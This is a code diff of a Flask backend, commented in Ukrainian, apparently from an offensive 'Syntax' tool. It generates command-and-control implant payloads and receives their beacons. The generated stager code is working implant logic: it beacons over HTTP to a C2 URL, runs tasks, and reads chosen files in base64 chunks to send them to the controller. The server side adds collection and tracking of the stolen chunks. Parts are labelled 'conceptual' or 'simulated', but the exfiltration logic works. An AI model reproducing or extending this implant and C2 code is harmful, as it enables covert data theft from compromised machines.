@@ -1,10 +1,9 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.8.7
-# Призначення: Backend на Flask з концептуальною ексфільтрацією файлів через C2.
-# Оновлення v1.8.7:
-#   - Додано новий тип завдання 'exfiltrate_file_chunked' для C2.
-#   - Оновлено логіку стейджера demo_c2_beacon_payload для обробки цього завдання та відправки файлу частинами.
-#   - Оновлено /api/c2/beacon_receiver для логування отриманих частин файлу.
-#   - Розширено логування для C2-взаємодії.
+# Syntax Flask Backend - Segment SFB-CORE-1.8.8
+# Призначення: Backend на Flask з серверною обробкою ексфільтрації файлів.
+# Оновлення v1.8.8:
+#   - Оновлено /api/c2/beacon_receiver для отримання, зберігання та "збірки" частин файлів.
+#   - Використовується exfiltrated_file_chunks_db для відстеження процесу ексфільтрації.
+#   - Оновлено логування для ексфільтрації.
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -25,13 +24,11 @@ import os
 import uuid 
 import shutil 
 
-VERSION_BACKEND = "1.8.7" # Оновлено версію
+VERSION_BACKEND = "1.8.8" # Оновлено версію
 
 simulated_implants_be = []
 pending_tasks_for_implants = {} 
-# Для зберігання частин файлів, що ексфільтруються (концептуально)
-exfiltrated_file_chunks_db = {} # {"implant_id_task_id_filepath": {"total_chunks": N, "received_chunks": {0: "data0", 1: "data1"}}}
-
+exfiltrated_file_chunks_db = {} # Формат: {"unique_file_key": {"total_chunks": N, "received_chunks": {0: "data0_b64", 1: "data1_b64"}, "file_path": "original_path", "task_id": "task_uuid"}}
 
 CONCEPTUAL_CVE_DATABASE_BE = {
     "apache httpd 2.4.53": [{"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "Apache HTTP Server 2.4.53 and earlier may not send the X-Frame-Options header..."}],
@@ -46,7 +43,7 @@ def initialize_simulated_implants_be():
     global simulated_implants_be, pending_tasks_for_implants, exfiltrated_file_chunks_db
     simulated_implants_be = []
     pending_tasks_for_implants = {} 
-    exfiltrated_file_chunks_db = {} # Очищаємо при реініціалізації
+    exfiltrated_file_chunks_db = {} 
     os_types = ["Windows_x64_10.0.22631", "Linux_x64_6.5.0", "Windows_Server_2022_Datacenter", "macOS_sonoma_14.1_arm64"]
     base_ip_prefixes = ["10.30.", "192.168.", "172.22."]
     num_implants = random.randint(4, 7)
@@ -67,7 +64,7 @@ def initialize_simulated_implants_be():
     simulated_implants_be.sort(key=lambda x: x["id"])
     print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів. Чергу завдань та базу ексфільтрованих файлів очищено.")
 
-CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.8.1)
+CONCEPTUAL_PARAMS_SCHEMA_BE = {
     "payload_archetype": {
         "type": str, "required": True,
         "allowed_values": [
@@ -825,7 +822,7 @@ def handle_generate_payload():
             "",
             f"def {execute_func_name_runtime}(content, arch_type):",
             "    print(f\"[PAYLOAD ({{arch_type}})] Ініціалізація логіки пейлоада з контентом (перші 30 байт): '{{str(content)[:30}}}...'\")",
-            "    if arch_type == 'demo_c2_beacon_payload':", 
+            "    if arch_type == 'demo_c2_beacon_payload':", # Логіка (без змін від v1.7.6)
             "        beacon_url = content", 
             "        implant_data = {",
             "            'implant_id': STAGER_IMPLANT_ID,",
@@ -836,7 +833,6 @@ def handle_generate_payload():
             "            'beacon_interval_sec': BEACON_INTERVAL_SEC", 
             "        }",
             "        last_task_result_package = None", 
-            "        # Змінні для стану ексфільтрації файлу",
             "        exfil_state = {'active': False, 'file_path': None, 'file_handle': None, 'chunk_size': 512, 'current_chunk': 0, 'total_chunks': 0}",
             "",
             "        while True:",
@@ -847,7 +843,6 @@ def handle_generate_payload():
             "                current_beacon_payload['task_success'] = last_task_result_package.get('success', False)",
             "                last_task_result_package = None ",
             "",
-            "            # Логіка ексфільтрації файлу, якщо активна",
             "            if exfil_state['active'] and exfil_state['file_handle']:",
             "                try:",
             "                    chunk_data = exfil_state['file_handle'].read(exfil_state['chunk_size'])",
@@ -863,11 +858,11 @@ def handle_generate_payload():
             "                        current_beacon_payload['file_exfil_chunk'] = exfil_result",
             "                        print(f\"[PAYLOAD_EXFIL] Підготовлено чанк #{{exfil_state['current_chunk']}} для {{exfil_state['file_path']}}\")",
             "                        exfil_state['current_chunk'] += 1",
-            "                    else: # Кінець файлу",
+            "                    else: ",
             "                        exfil_state['file_handle'].close()",
             "                        exfil_result = {",
             "                            'file_path': exfil_state['file_path'],",
-            "                            'chunk_num': exfil_state['current_chunk'] -1, # Останній відправлений чанк",
+            "                            'chunk_num': exfil_state['current_chunk'] -1, ",
             "                            'total_chunks': exfil_state['total_chunks'],",
             "                            'data_b64': '',",
             "                            'is_final': True",
@@ -882,10 +877,10 @@ def handle_generate_payload():
             "                    current_beacon_payload['file_exfil_error'] = str(e_exfil_read)",
             "",
             "            try:",
-            "                print(f\"[PAYLOAD_BEACON] Надсилання маячка на {{beacon_url}} з даними: {{ {k: (v[:50] + '...' if isinstance(v, str) and len(v) > 50 else v) for k,v in current_beacon_payload.items()} }}\")", # Скорочений вивід даних
+            "                print(f\"[PAYLOAD_BEACON] Надсилання маячка на {{beacon_url}} з даними: {{ {k: (v[:50] + '...' if isinstance(v, str) and len(v) > 50 else v) for k,v in current_beacon_payload.items()} }}\")", 
             "                data_encoded = json_module.dumps(current_beacon_payload).encode('utf-8')",
             "                req = urllib.request.Request(beacon_url, data=data_encoded, headers={'Content-Type': 'application/json', 'User-Agent': 'SyntaxBeaconClient/1.0'})",
-            "                with urllib.request.urlopen(req, timeout=20) as response:", # Збільшено таймаут
+            "                with urllib.request.urlopen(req, timeout=20) as response:", 
             "                    response_data_raw = response.read().decode('utf-8')",
             "                    print(f\"[PAYLOAD_BEACON] Відповідь C2 (статус {{response.status}}): {{response_data_raw[:200]}}...\")",
             "                    c2_response_parsed = json_module.loads(response_data_raw)",
@@ -914,7 +909,7 @@ def handle_generate_payload():
             "                        elif task_type == 'get_system_info':",
             "                            task_output = f'Hostname: {{socket.gethostname()}}\\nOS: {{os.name}}\\nUser: {{implant_data[\"username\"]}}'",
             "                            task_success = True",
-            "                        elif task_type == 'exfiltrate_file_chunked':",
+            "                        elif task_type == 'exfiltrate_file_chunked':", 
             "                            file_to_exfil = task_params_str",
             "                            print(f\"[PAYLOAD_TASK_EXFIL_INIT] Ініціалізація ексфільтрації файлу: {{file_to_exfil}}\")",
             "                            if os.path.exists(file_to_exfil) and os.path.isfile(file_to_exfil):",
@@ -938,8 +933,7 @@ def handle_generate_payload():
             "                        task_success = False",
             "                        print(f\"[PAYLOAD_TASK_ERROR] {{task_output}}\")",
             "                    last_task_result_package = {'task_id': task_id, 'result': task_output, 'success': task_success}",
-            "                    # Не чекаємо тут, якщо отримали завдання, наступний маячок піде одразу з результатом",
-            "                    continue # Переходимо до наступної ітерації циклу, щоб відправити результат",
+            "                    continue ",
             "                else:",
             "                    print(f\"[PAYLOAD_BEACON] Нових завдань від C2 не отримано.\")",
             "                    last_task_result_package = None ",
@@ -954,15 +948,14 @@ def handle_generate_payload():
             "            except Exception as e_beacon_loop:",
             "                print(f\"[PAYLOAD_BEACON_ERROR] Загальна помилка в циклі маячка: {{e_beacon_loop}}. Повторна спроба через {{BEACON_INTERVAL_SEC}} сек.\")",
             "            ",
-            "            # Якщо не було завдання або ексфільтрації, чекаємо перед наступним маячком",
             "            if not next_task and not exfil_state['active']:",
             "                print(f\"[PAYLOAD_BEACON] Очікування {{BEACON_INTERVAL_SEC}} секунд до наступного маячка...\")",
             "                time.sleep(BEACON_INTERVAL_SEC)",
-            "            elif exfil_state['active']:", # Якщо ексфільтрація активна, коротша затримка для швидшої передачі
+            "            elif exfil_state['active']:", 
             "                 time.sleep(random.uniform(0.1, 0.5))",
 
 
-            "    elif arch_type == 'dns_beacon_c2_concept':", # ... (без змін від v1.8.3)
+            "    elif arch_type == 'dns_beacon_c2_concept':", # Логіка (без змін від v1.8.3)
             "        c2_zone = content", 
             "        dns_prefix = DNS_BEACON_SUBDOMAIN_PREFIX",
             "        implant_id_dns = STAGER_IMPLANT_ID",
@@ -1314,10 +1307,10 @@ def handle_run_recon():
         log_messages.append(f"[BACKEND_FATAL_ERROR] {str(e)}")
         return jsonify({"success": False, "error": "Server error during recon", "reconLog": "\n".join(log_messages)}), 500
 
-@app.route('/api/c2/beacon_receiver', methods=['POST']) # Логіка (без змін)
+@app.route('/api/c2/beacon_receiver', methods=['POST'])
 def handle_c2_beacon():
     log_messages_c2_beacon = [f"[C2_BEACON_RECEIVER v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
-    global pending_tasks_for_implants, simulated_implants_be
+    global pending_tasks_for_implants, simulated_implants_be, exfiltrated_file_chunks_db
     try:
         beacon_data = request.get_json()
         if not beacon_data:
@@ -1330,10 +1323,50 @@ def handle_c2_beacon():
         
         last_task_id_received = beacon_data.get("last_task_id")
         last_task_result_received = beacon_data.get("last_task_result")
+        task_success_received = beacon_data.get("task_success")
+
         if last_task_id_received:
-            log_messages_c2_beacon.append(f"   Результат завдання '{last_task_id_received}': {str(last_task_result_received)[:200]}{'...' if len(str(last_task_result_received)) > 200 else ''}")
-        else:
-            log_messages_c2_beacon.append(f"   Дані маячка (без результату попереднього завдання): {json.dumps(beacon_data)}")
+            log_messages_c2_beacon.append(f"   Результат завдання '{last_task_id_received}' (Успіх: {task_success_received}): {str(last_task_result_received)[:200]}{'...' if len(str(last_task_result_received)) > 200 else ''}")
+        
+        # Обробка отриманих частин файлу
+        file_exfil_chunk_data = beacon_data.get("file_exfil_chunk")
+        if file_exfil_chunk_data and last_task_id_received: # Переконуємося, що чанк прив'язаний до завдання
+            file_path = file_exfil_chunk_data.get("file_path")
+            chunk_num = file_exfil_chunk_data.get("chunk_num")
+            total_chunks = file_exfil_chunk_data.get("total_chunks")
+            data_b64 = file_exfil_chunk_data.get("data_b64")
+            is_final_chunk = file_exfil_chunk_data.get("is_final", False)
+            
+            file_key = f"{implant_id_from_beacon}_{last_task_id_received}_{file_path}" # Унікальний ключ для файлу, що ексфільтрується
+
+            if file_key not in exfiltrated_file_chunks_db:
+                exfiltrated_file_chunks_db[file_key] = {
+                    "file_path": file_path,
+                    "task_id": last_task_id_received,
+                    "total_chunks": total_chunks,
+                    "received_chunks": {},
+                    "implant_id": implant_id_from_beacon,
+                    "first_seen": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                }
+            
+            if data_b64: # Якщо є дані (не останній порожній чанк)
+                 exfiltrated_file_chunks_db[file_key]["received_chunks"][chunk_num] = data_b64
+                 log_messages_c2_beacon.append(f"   [EXFIL_CHUNK] Отримано чанк #{chunk_num}/{total_chunks} для '{file_path}' (ID завдання: {last_task_id_received}).")
+
+            if is_final_chunk or (total_chunks is not None and len(exfiltrated_file_chunks_db[file_key]["received_chunks"]) == total_chunks):
+                log_messages_c2_beacon.append(f"   [EXFIL_COMPLETE] Всі {total_chunks} чанків для '{file_path}' (ID завдання: {last_task_id_received}) отримано від {implant_id_from_beacon}.")
+                # TODO_SYNTAX: Реалізувати збірку файлу з exfiltrated_file_chunks_db[file_key]["received_chunks"]
+                # Наприклад:
+                # assembled_file_content_b64 = ""
+                # for i in range(total_chunks):
+                #     assembled_file_content_b64 += exfiltrated_file_chunks_db[file_key]["received_chunks"].get(i, "")
+                # assembled_file_bytes = base64.b64decode(assembled_file_content_b64.encode('utf-8'))
+                # with open(f"exfiltrated_{os.path.basename(file_path)}", "wb") as f_out:
+                #     f_out.write(assembled_file_bytes)
+                # log_messages_c2_beacon.append(f"   [EXFIL_SAVE] Файл '{file_path}' (начебто) зібрано та збережено.")
+                del exfiltrated_file_chunks_db[file_key] # Видаляємо після "збірки"
+        elif beacon_data.get("file_exfil_error"):
+             log_messages_c2_beacon.append(f"   [EXFIL_ERROR_REPORTED] Імплант повідомив про помилку ексфільтрації: {beacon_data['file_exfil_error']}")
 
 
         implant_found_in_list = False
@@ -1384,7 +1417,7 @@ def handle_c2_beacon():
         return jsonify({"success": False, "error": "Server error processing beacon", "log": "\n".join(log_messages_c2_beacon)}), 500
 
 # --- Новий ендпоінт для симуляції DNS Resolver (для DNS C2) ---
-@app.route('/api/c2/dns_resolver_sim', methods=['GET'])
+@app.route('/api/c2/dns_resolver_sim', methods=['GET']) # Логіка (без змін)
 def handle_dns_resolver_sim():
     log_messages_dns_sim = [f"[DNS_RESOLVER_SIM v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
     global pending_tasks_for_implants
@@ -1494,9 +1527,11 @@ def handle_c2_task():
             elif task_type == "exec":
                  cmd_to_exec = task_params if task_params else "whoami"
                  task_result_output += f"  Виконання '{cmd_to_exec}': Успішно (імітація). Вивід: SimUser_{random.randint(1,100)}"
-            elif task_type == "exfiltrate_file_concept":
+            elif task_type == "exfiltrate_file_concept": # Залишаємо для сумісності, але нові завдання будуть exfiltrate_file_chunked
                 file_to_exfil = task_params if task_params else "default.dat"
-                task_result_output += f"  Ексфільтрація '{file_to_exfil}': Завершено (імітація). Розмір: {random.randint(10,1000)}KB."
+                task_result_output += f"  Ексфільтрація (старий тип) '{file_to_exfil}': Завершено (імітація). Розмір: {random.randint(10,1000)}KB."
+            elif task_type == "exfiltrate_file_chunked": # Обробка нового типу завдання (для негайного, хоча зазвичай ставиться в чергу)
+                task_result_output += f"  Завдання 'exfiltrate_file_chunked' для '{task_params}' отримано, але зазвичай виконується через маячки."
             else: task_result_output += "  Невідомий тип завдання."
             
             if target_implant_obj: target_implant_obj["status"] = current_status_before_task 
